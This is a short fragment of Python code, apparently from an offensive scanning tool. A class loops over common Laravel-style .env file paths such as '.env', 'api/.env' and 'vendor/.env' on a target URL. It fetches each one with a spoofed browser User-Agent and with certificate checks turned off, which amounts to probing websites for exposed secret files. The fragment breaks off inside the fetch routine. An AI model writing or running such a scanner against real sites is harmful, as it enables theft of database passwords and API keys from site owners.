...
class Gaskeun:
	...
	def x(self):
		for path in [".env","api/.env","laravel/.env","v1/.env","v2/.env","vendor/.env","public/.env"]:
			target = self.url if self.url.endswith("/") else self.url + "/"
			self.scan(target+path)
	
	def scan(self,site):
		try:
			raw = req.get(site,headers={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'},timeout=5,verify=False).text
